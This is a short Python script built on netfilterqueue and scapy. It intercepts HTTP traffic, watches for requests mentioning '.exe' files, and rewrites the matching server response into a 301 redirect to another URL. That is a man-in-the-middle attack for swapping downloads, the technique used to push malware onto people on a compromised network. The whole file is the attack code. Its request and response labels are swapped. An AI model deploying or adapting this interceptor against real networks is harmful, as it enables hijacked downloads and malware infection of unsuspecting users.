import netfilterqueue

import scapy.all as scapy




clientlist=[]
def captured_packet(packet):


    scapy_packet=scapy.IP(packet.get_payload())


    if scapy_packet.haslayer(scapy.Raw):

        if scapy_packet[scapy.TCP].sport==80:


            print("[+] HTTP REQUEST")


            if ".exe" in scapy_packet[scapy.Raw].load:


                clientlist.append(scapy_packet[scapy.TCP].ack)


                scapy_packet.show()







        elif scapy_packet[scapy.TCP].dport==80:

            print("[+] HTTP RESPONSE")



            if scapy_packet[scapy.TCP].seq in clientlist:

                print("[+] modyfing the packet ")


                clientlist.remove(scapy_packet[scapy.TCP].seq)




                scapy_packet[scapy.Raw].load="HTTP/1.1 301 Moved Permanently \n Location: http://www.example.org/index.asp \n\n"



                del scapy_packet[scapy.IP].len
                del scapy_packet[scapy.IP].chksum
                del scapy_packet[scapy.TCP].chksum


                packet.set_payload(str(scapy_packet))


queue=netfilterqueue.NetfilterQueue()



queue.bind(1,captured_packet)


queue.run()